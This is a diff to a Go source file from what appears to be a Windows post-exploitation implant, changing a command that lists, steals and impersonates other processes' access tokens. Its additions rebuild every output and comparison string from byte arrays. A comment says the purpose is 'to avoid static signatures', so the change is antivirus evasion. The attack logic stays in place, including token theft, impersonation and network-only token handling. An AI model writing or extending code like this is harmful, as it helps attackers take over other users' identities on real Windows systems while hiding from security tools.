@@ -6,11 +6,62 @@ package main
 
 import (
 	"fmt"
+	"strconv"
 	"strings"
 	"sync"
 	"syscall"
 	"time"
 	"unsafe"
+)
+
+// Steal token strings (constructed to avoid static signatures)
+var (
+	// Source identifiers
+	stSourceStolen  = string([]byte{0x73})                                                       // s
+	stSourceCreated = string([]byte{0x63})                                                       // c
+	stStolenCmp     = string([]byte{0x73, 0x74, 0x6f, 0x6c, 0x65, 0x6e})                         // stolen (for comparison)
+	stCreatedCmp    = string([]byte{0x63, 0x72, 0x65, 0x61, 0x74, 0x65, 0x64})                   // created (for comparison)
+
+	// Token types
+	stImpersonation = string([]byte{0x69, 0x6d, 0x70, 0x65, 0x72, 0x73, 0x6f, 0x6e, 0x61, 0x74, 0x69, 0x6f, 0x6e}) // impersonation
+
+	// Other strings
+	stUnknownLower = string([]byte{0x75, 0x6e, 0x6b, 0x6e, 0x6f, 0x77, 0x6e})                   // unknown
+	stUnknown      = string([]byte{0x55, 0x6e, 0x6b, 0x6e, 0x6f, 0x77, 0x6e})                   // Unknown
+	stBackslash    = string([]byte{0x5c})                                                       // \
+	stNewline      = string([]byte{0x0a})                                                       // \n
+	stUnderscore   = string([]byte{0x5f})                                                       // _
+	stSpace        = string([]byte{0x20})                                                       // (space)
+	stColon        = string([]byte{0x3a})                                                       // :
+	stPipe         = string([]byte{0x7c})                                                       // |
+	stNone         = string([]byte{0x28, 0x6e, 0x6f, 0x6e, 0x65, 0x29})                         // (none)
+	stDots         = string([]byte{0x2e, 0x2e, 0x2e})                                           // ...
+
+	// Output format strings
+	stTokenInfo      = string([]byte{0x54, 0x6f, 0x6b, 0x65, 0x6e, 0x20, 0x49, 0x6e, 0x66, 0x6f, 0x3a, 0x0a})                                                                                               // Token Info:\n
+	stProcessUser    = string([]byte{0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x20, 0x55, 0x73, 0x65, 0x72, 0x3a, 0x20})                                                                                   // Process User:
+	stImpTokenPrefix = string([]byte{0x0a, 0x49, 0x6d, 0x70, 0x65, 0x72, 0x73, 0x6f, 0x6e, 0x61, 0x74, 0x69, 0x6e, 0x67, 0x20, 0x54, 0x6f, 0x6b, 0x65, 0x6e, 0x3a, 0x20})                                   // \nImpersonating Token:
+	stUserPrefix     = string([]byte{0x20, 0x20, 0x55, 0x73, 0x65, 0x72, 0x3a, 0x20})                                                                                                                       //   User:
+	stSourcePrefix   = string([]byte{0x20, 0x20, 0x53, 0x6f, 0x75, 0x72, 0x63, 0x65, 0x3a, 0x20})                                                                                                           //   Source:
+	stProcessPrefix  = string([]byte{0x20, 0x20, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x3a, 0x20})                                                                                                     //   Process:
+	stPidPrefix      = string([]byte{0x20, 0x28, 0x50, 0x49, 0x44, 0x3a, 0x20})                                                                                                                             //  (PID:
+	stPidSuffix      = string([]byte{0x29, 0x0a})                                                                                                                                                           // )\n
+	stLogonPrefix    = string([]byte{0x20, 0x20, 0x4c, 0x6f, 0x67, 0x6f, 0x6e, 0x20, 0x54, 0x79, 0x70, 0x65, 0x3a, 0x20})                                                                                   //   Logon Type:
+	stNoActiveImp    = string([]byte{0x0a, 0x4e, 0x6f, 0x20, 0x61, 0x63, 0x74, 0x69, 0x76, 0x65, 0x20, 0x69, 0x6d, 0x70, 0x65, 0x72, 0x73, 0x6f, 0x6e, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x0a})                 // \nNo active impersonation\n
+	stNetOnlyTokPre  = string([]byte{0x0a, 0x4e, 0x65, 0x74, 0x77, 0x6f, 0x72, 0x6b, 0x2d, 0x4f, 0x6e, 0x6c, 0x79, 0x20, 0x54, 0x6f, 0x6b, 0x65, 0x6e, 0x3a, 0x20})                                         // \nNetwork-Only Token:
+	stOrigUserPre    = string([]byte{0x0a, 0x4f, 0x72, 0x69, 0x67, 0x69, 0x6e, 0x61, 0x6c, 0x20, 0x55, 0x73, 0x65, 0x72, 0x3a, 0x20})                                                                       // \nOriginal User:
+	stNetOnlyHdr     = string([]byte{0x4e, 0x65, 0x74, 0x4f, 0x6e, 0x6c, 0x79, 0x3a, 0x0a})                                                                                                                 // NetOnly:\n
+	stActiveNetPre   = string([]byte{0x41, 0x63, 0x74, 0x69, 0x76, 0x65, 0x20, 0x4e, 0x65, 0x74, 0x4f, 0x6e, 0x6c, 0x79, 0x20, 0x54, 0x6f, 0x6b, 0x65, 0x6e, 0x3a, 0x20})                                   // Active NetOnly Token:
+	stUserPre2       = string([]byte{0x55, 0x73, 0x65, 0x72, 0x3a, 0x20})                                                                                                                                   // User:
+	stSourcePre2     = string([]byte{0x53, 0x6f, 0x75, 0x72, 0x63, 0x65, 0x3a, 0x20})                                                                                                                       // Source:
+	stProcessPre2    = string([]byte{0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x3a, 0x20})                                                                                                                 // Process:
+	stLogonPre2      = string([]byte{0x4c, 0x6f, 0x67, 0x6f, 0x6e, 0x20, 0x54, 0x79, 0x70, 0x65, 0x3a, 0x20})                                                                                               // Logon Type:
+	stNetOnlyToksHdr = string([]byte{0x0a, 0x4e, 0x65, 0x74, 0x4f, 0x6e, 0x6c, 0x79, 0x20, 0x54, 0x6f, 0x6b, 0x65, 0x6e, 0x73, 0x3a, 0x0a})                                                                 // \nNetOnly Tokens:\n
+	stIndent2        = string([]byte{0x20, 0x20})                                                                                                                                                           //   (2 spaces)
+	stMode0          = string([]byte{0x30})                                                                                                                                                                 // 0
+	stMode1          = string([]byte{0x31})                                                                                                                                                                 // 1
+	stDot            = string([]byte{0x2e})                                                                                                                                                                 // .
+	stComma          = string([]byte{0x2c})                                                                                                                                                                 // ,
 )
 
 // TokenMetadata stores metadata about a token
@@ -90,8 +141,8 @@ func (c *StealTokenCommand) listTokens() CommandResult {
 					defer token.Close()
 
 					userName, domainName := c.getTokenUserInfo(syscall.Handle(token))
-					if domainName != "" && domainName != "." {
-						userInfo = fmt.Sprintf("%s\\%s", domainName, userName)
+					if domainName != "" && domainName != stDot {
+						userInfo = domainName + stBackslash + userName
 					} else {
 						userInfo = userName
 					}
@@ -119,7 +170,7 @@ func (c *StealTokenCommand) listTokens() CommandResult {
 	}
 
 	// Summary as compact format: accessible,denied
-	output.WriteString(fmt.Sprintf("\n%d,%d\n", accessibleCount, deniedCount))
+	output.WriteString(stNewline + strconv.Itoa(accessibleCount) + stComma + strconv.Itoa(deniedCount) + stNewline)
 
 	return CommandResult{
 		Output:      output.String(),
@@ -157,7 +208,7 @@ func (c *StealTokenCommand) stealAndImpersonate(ctx *CommandContext, pid int, na
 
 	// Get process name
 	processes, _ := getProcessList()
-	processName := "unknown"
+	processName := stUnknownLower
 	for _, p := range processes {
 		if p.PID == int32(pid) {
 			processName = p.Name
@@ -167,10 +218,10 @@ func (c *StealTokenCommand) stealAndImpersonate(ctx *CommandContext, pid int, na
 
 	// Auto-generate name if not provided
 	if name == "" {
-		name = fmt.Sprintf("%s_%s_%d", targetDomain, targetUser, pid)
+		name = targetDomain + stUnderscore + targetUser + stUnderscore + strconv.Itoa(pid)
 		// Clean up the name
-		name = strings.ReplaceAll(name, " ", "_")
-		name = strings.ReplaceAll(name, "\\", "_")
+		name = strings.ReplaceAll(name, stSpace, stUnderscore)
+		name = strings.ReplaceAll(name, stBackslash, stUnderscore)
 		name = strings.ToLower(name)
 	}
 
@@ -208,11 +259,11 @@ func (c *StealTokenCommand) stealAndImpersonate(ctx *CommandContext, pid int, na
 	globalTokenStore.Metadata[name] = TokenMetadata{
 		User:        targetUser,
 		Domain:      targetDomain,
-		Source:      "s",
+		Source:      stSourceStolen,
 		SourcePID:   uint32(pid),
 		ProcessName: processName,
 		StoredAt:    time.Now(),
-		TokenType:   "impersonation",
+		TokenType:   stImpersonation,
 		NetOnly:     netOnly,
 	}
 
@@ -298,7 +349,7 @@ func (c *StealTokenCommand) storeToken(ctx *CommandContext, pid int, name string
 
 	// Get process name
 	processes, _ := getProcessList()
-	processName := "unknown"
+	processName := stUnknownLower
 	for _, p := range processes {
 		if p.PID == int32(pid) {
 			processName = p.Name
@@ -336,11 +387,11 @@ func (c *StealTokenCommand) storeToken(ctx *CommandContext, pid int, name string
 	globalTokenStore.Metadata[name] = TokenMetadata{
 		User:        targetUser,
 		Domain:      targetDomain,
-		Source:      "s",
+		Source:      stSourceStolen,
 		SourcePID:   uint32(pid),
 		ProcessName: processName,
 		StoredAt:    time.Now(),
-		TokenType:   "impersonation",
+		TokenType:   stImpersonation,
 		NetOnly:     netOnly,
 	}
 
@@ -422,25 +473,25 @@ func (c *StealTokenCommand) listStoredTokens() CommandResult {
 	output.WriteString(Table(TSTok, len(globalTokenStore.Tokens)) + "\n")
 
 	for name, metadata := range globalTokenStore.Metadata {
-		userInfo := fmt.Sprintf("%s\\%s", metadata.Domain, metadata.User)
+		userInfo := metadata.Domain + stBackslash + metadata.User
 
 		details := ""
-		if metadata.Source == "s" { // stolen
+		if metadata.Source == stSourceStolen { // stolen
 			procName := metadata.ProcessName
 			if len(procName) > 15 {
-				procName = procName[:12] + "..."
+				procName = procName[:12] + stDots
 			}
-			details = fmt.Sprintf("%s:%d", procName, metadata.SourcePID)
-		} else if metadata.Source == "c" { // created
+			details = procName + stColon + strconv.Itoa(int(metadata.SourcePID))
+		} else if metadata.Source == stSourceCreated { // created
 			details = metadata.LogonType
 		}
 
 		storedAt := metadata.StoredAt.Format("15:04:05")
 
 		// Mode: 0=full, 1=netonly
-		mode := "0"
+		mode := stMode0
 		if metadata.NetOnly {
-			mode = "1"
+			mode = stMode1
 		}
 
 		status := ""
@@ -460,11 +511,10 @@ func (c *StealTokenCommand) listStoredTokens() CommandResult {
 	if globalTokenStore.IsImpersonating {
 		activeToken = globalTokenStore.ActiveToken
 	}
-	output.WriteString(fmt.Sprintf("\n%d|%s|%s|%s\\%s\n",
-		len(globalTokenStore.Tokens),
-		activeToken,
-		globalTokenStore.NetOnlyToken,
-		currentDomain, currentUser))
+	output.WriteString(stNewline + strconv.Itoa(len(globalTokenStore.Tokens)) + stPipe +
+		activeToken + stPipe +
+		globalTokenStore.NetOnlyToken + stPipe +
+		currentDomain + stBackslash + currentUser + stNewline)
 
 	return CommandResult{
 		Output:      output.String(),
@@ -520,40 +570,40 @@ func (c *StealTokenCommand) removeStoredToken(ctx *CommandContext, name string) 
 
 func (c *StealTokenCommand) getCurrentTokenInfo() CommandResult {
 	var output strings.Builder
-	output.WriteString("Token Info:\n")
+	output.WriteString(stTokenInfo)
 
 	// Get current process/thread token info
 	currentUser, currentDomain := c.getCurrentUserInfo()
-	output.WriteString(fmt.Sprintf("Process User: %s\\%s\n", currentDomain, currentUser))
+	output.WriteString(stProcessUser + currentDomain + stBackslash + currentUser + stNewline)
 
 	globalTokenStore.mu.RLock()
 	defer globalTokenStore.mu.RUnlock()
 
 	if globalTokenStore.IsImpersonating && globalTokenStore.ActiveToken != "" {
-		output.WriteString(fmt.Sprintf("\nImpersonating Token: %s\n", globalTokenStore.ActiveToken))
+		output.WriteString(stImpTokenPrefix + globalTokenStore.ActiveToken + stNewline)
 		if metadata, exists := globalTokenStore.Metadata[globalTokenStore.ActiveToken]; exists {
-			output.WriteString(fmt.Sprintf("  User: %s\\%s\n", metadata.Domain, metadata.User))
-			output.WriteString(fmt.Sprintf("  Source: %s\n", metadata.Source))
-			if metadata.Source == "stolen" {
-				output.WriteString(fmt.Sprintf("  Process: %s (PID: %d)\n", metadata.ProcessName, metadata.SourcePID))
-			} else if metadata.Source == "created" {
-				output.WriteString(fmt.Sprintf("  Logon Type: %s\n", metadata.LogonType))
+			output.WriteString(stUserPrefix + metadata.Domain + stBackslash + metadata.User + stNewline)
+			output.WriteString(stSourcePrefix + metadata.Source + stNewline)
+			if metadata.Source == stStolenCmp {
+				output.WriteString(stProcessPrefix + metadata.ProcessName + stPidPrefix + strconv.Itoa(int(metadata.SourcePID)) + stPidSuffix)
+			} else if metadata.Source == stCreatedCmp {
+				output.WriteString(stLogonPrefix + metadata.LogonType + stNewline)
 			}
 		}
 	} else {
-		output.WriteString("\nNo active impersonation\n")
+		output.WriteString(stNoActiveImp)
 	}
 
 	if globalTokenStore.NetOnlyToken != "" {
-		output.WriteString(fmt.Sprintf("\nNetwork-Only Token: %s\n", globalTokenStore.NetOnlyToken))
+		output.WriteString(stNetOnlyTokPre + globalTokenStore.NetOnlyToken + stNewline)
 		if metadata, exists := globalTokenStore.Metadata[globalTokenStore.NetOnlyToken]; exists {
-			output.WriteString(fmt.Sprintf("  User: %s\\%s\n", metadata.Domain, metadata.User))
-			output.WriteString(fmt.Sprintf("  Source: %s\n", metadata.Source))
+			output.WriteString(stUserPrefix + metadata.Domain + stBackslash + metadata.User + stNewline)
+			output.WriteString(stSourcePrefix + metadata.Source + stNewline)
 		}
 	}
 
 	if globalTokenStore.OriginalUser != "" {
-		output.WriteString(fmt.Sprintf("\nOriginal User: %s\\%s\n", globalTokenStore.OriginalDomain, globalTokenStore.OriginalUser))
+		output.WriteString(stOrigUserPre + globalTokenStore.OriginalDomain + stBackslash + globalTokenStore.OriginalUser + stNewline)
 	}
 
 	return CommandResult{
@@ -625,33 +675,33 @@ func (c *StealTokenCommand) showNetOnlyStatus() CommandResult {
 	defer globalTokenStore.mu.RUnlock()
 
 	var output strings.Builder
-	output.WriteString("NetOnly:\n")
+	output.WriteString(stNetOnlyHdr)
 
 	if globalTokenStore.NetOnlyToken == "" {
-		output.WriteString(Succ(S0) + "\n")
+		output.WriteString(Succ(S0) + stNewline)
 	} else {
 		metadata := globalTokenStore.Metadata[globalTokenStore.NetOnlyToken]
-		output.WriteString(fmt.Sprintf("Active NetOnly Token: %s\n", globalTokenStore.NetOnlyToken))
-		output.WriteString(fmt.Sprintf("User: %s\\%s\n", metadata.Domain, metadata.User))
-		output.WriteString(fmt.Sprintf("Source: %s\n", metadata.Source))
-		if metadata.Source == "stolen" {
-			output.WriteString(fmt.Sprintf("Process: %s (PID: %d)\n", metadata.ProcessName, metadata.SourcePID))
-		} else if metadata.Source == "created" {
-			output.WriteString(fmt.Sprintf("Logon Type: %s\n", metadata.LogonType))
+		output.WriteString(stActiveNetPre + globalTokenStore.NetOnlyToken + stNewline)
+		output.WriteString(stUserPre2 + metadata.Domain + stBackslash + metadata.User + stNewline)
+		output.WriteString(stSourcePre2 + metadata.Source + stNewline)
+		if metadata.Source == stStolenCmp {
+			output.WriteString(stProcessPre2 + metadata.ProcessName + stPidPrefix + strconv.Itoa(int(metadata.SourcePID)) + stPidSuffix)
+		} else if metadata.Source == stCreatedCmp {
+			output.WriteString(stLogonPre2 + metadata.LogonType + stNewline)
 		}
 	}
 
 	// List all tokens marked as netonly
-	output.WriteString("\nNetOnly Tokens:\n")
+	output.WriteString(stNetOnlyToksHdr)
 	hasNetOnlyTokens := false
 	for name, metadata := range globalTokenStore.Metadata {
 		if metadata.NetOnly {
 			hasNetOnlyTokens = true
-			output.WriteString(fmt.Sprintf("  %s: %s\\%s\n", name, metadata.Domain, metadata.User))
+			output.WriteString(stIndent2 + name + stColon + stSpace + metadata.Domain + stBackslash + metadata.User + stNewline)
 		}
 	}
 	if !hasNetOnlyTokens {
-		output.WriteString("  (none)\n")
+		output.WriteString(stIndent2 + stNone + stNewline)
 	}
 
 	return CommandResult{
@@ -678,7 +728,7 @@ func (c *StealTokenCommand) getCurrentUserInfo() (string, string) {
 		return c.getTokenUserInfo(syscall.Handle(token))
 	}
 
-	return "Unknown", "Unknown"
+	return stUnknown, stUnknown
 }
 
 func (c *StealTokenCommand) getTokenUserInfo(token syscall.Handle) (string, string) {
@@ -693,7 +743,7 @@ func (c *StealTokenCommand) getTokenUserInfo(token syscall.Handle) (string, stri
 	)
 
 	if needed == 0 {
-		return "Unknown", ""
+		return stUnknown, ""
 	}
 
 	// Allocate buffer and get token information
@@ -707,7 +757,7 @@ func (c *StealTokenCommand) getTokenUserInfo(token syscall.Handle) (string, stri
 	)
 
 	if ret == 0 {
-		return "Unknown", ""
+		return stUnknown, ""
 	}
 
 	// Extract SID from buffer
@@ -730,7 +780,7 @@ func (c *StealTokenCommand) getTokenUserInfo(token syscall.Handle) (string, stri
 	)
 
 	if ret == 0 {
-		return "Unknown", ""
+		return stUnknown, ""
 	}
 
 	return syscall.UTF16ToString(nameBuffer[:nameSize]),
